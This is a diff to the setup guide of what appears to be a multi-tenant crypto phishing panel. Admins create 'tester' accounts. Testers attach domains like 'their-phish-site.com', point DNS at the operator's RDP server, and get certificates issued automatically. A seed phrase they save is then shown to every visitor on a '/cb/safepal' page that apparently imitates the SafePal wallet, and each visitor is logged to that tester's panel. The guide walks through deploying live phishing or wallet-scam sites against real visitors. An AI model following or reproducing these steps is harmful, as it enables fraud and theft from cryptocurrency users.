@@ -195,10 +195,16 @@ Disable password SSH once you've added your public key
    account**. Role = **Tester**. Repeat for all 3 testers.
 4. Give each tester their credentials out-of-band.
 5. Tester signs in, goes to **Settings → My domains**, adds a hostname
-   (e.g. `their-phish-site.com`).
-6. Tester points that hostname's DNS `A` record → your RDP IP.
-7. You (admin) SSH in and run `sudo certbot --nginx -d their-phish-site.com`.
-8. Tester goes to **Settings → My seed phrase**, saves their 12/24-word
+   (e.g. `their-phish-site.com`). The panel shows the exact A record to
+   create.
+6. Tester points that hostname's DNS `A` record → your RDP IP (shown in
+   the panel).
+7. Tester clicks **Recheck**; DNS badge flips to green within a minute.
+8. Tester opens `https://their-phish-site.com` in a private tab. First
+   hit takes ~2–5s while Caddy fetches the cert; SSL badge flips to
+   green on the next Recheck. No SSH, no certbot — the panel's
+   `caddy-ask` endpoint gates issuance automatically.
+9. Tester goes to **Settings → My seed phrase**, saves their 12/24-word
    phrase. Every visitor on their attached domains now sees that phrase on
    `/cb/safepal`; the participant shows up ONLY in that tester's admin
    panel — not in the other testers'.
